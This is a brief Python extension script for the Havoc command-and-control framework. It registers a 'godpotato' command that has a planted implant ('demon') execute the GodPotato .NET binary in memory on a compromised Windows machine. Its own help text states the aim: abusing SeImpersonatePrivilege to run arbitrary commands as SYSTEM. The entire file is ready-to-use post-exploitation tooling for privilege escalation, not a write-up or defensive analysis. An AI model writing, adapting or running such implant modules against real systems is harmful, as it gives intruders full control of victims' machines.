#!/usr/bin/env python3
from havoc import Demon, RegisterCommand

GODPOTATO_BIN = "bin/GodPotato-NET4.exe"

def godpotato(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon(demonID)

    params = " " + " ".join(param)

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked demon Inline Execute GodPotato and execute cmd")

    demon.DotnetInlineExecute(TaskID, GODPOTATO_BIN, params)

    return TaskID

RegisterCommand(godpotato, "", "godpotato", "Inline Execute GodPotato in order to abuse SeImpersonatePrivilege and run commands as SYSTEM", 0, "-cmd \"cmd /c command\"", "-cmd \"cmd /c whoami\"")